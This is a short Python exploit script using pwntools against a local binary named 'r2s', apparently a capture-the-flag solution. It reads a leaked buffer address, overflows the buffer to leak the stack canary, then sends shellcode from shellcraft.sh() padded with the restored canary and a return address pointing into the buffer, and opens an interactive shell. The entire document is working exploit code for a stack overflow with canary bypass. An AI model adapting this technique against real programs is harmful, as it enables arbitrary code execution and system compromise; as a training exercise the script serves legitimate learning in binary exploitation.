from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./r2s")

context.arch = "amd64"

p.recvuntil("buf: ")
buf = int(p.recvline()[:-1], 16)
slog("Address of buf", buf)

p.recvuntil("$rbp: ")
buf2sfp = int(p.recvline().split()[0])
buf2canary = buf2sfp - 8
slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2canary)

payload = b"A" * (buf2canary + 1)

p.sendafter("Input:", payload)
p.recvuntil(payload)
canary = u64(b"\x00" + p.recvn(7))
slog("Canary", canary)

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2canary, b"A") + p64(canary) + b"B" * 0x8 + p64(buf)
p.sendlineafter("Input:", payload)

p.interactive()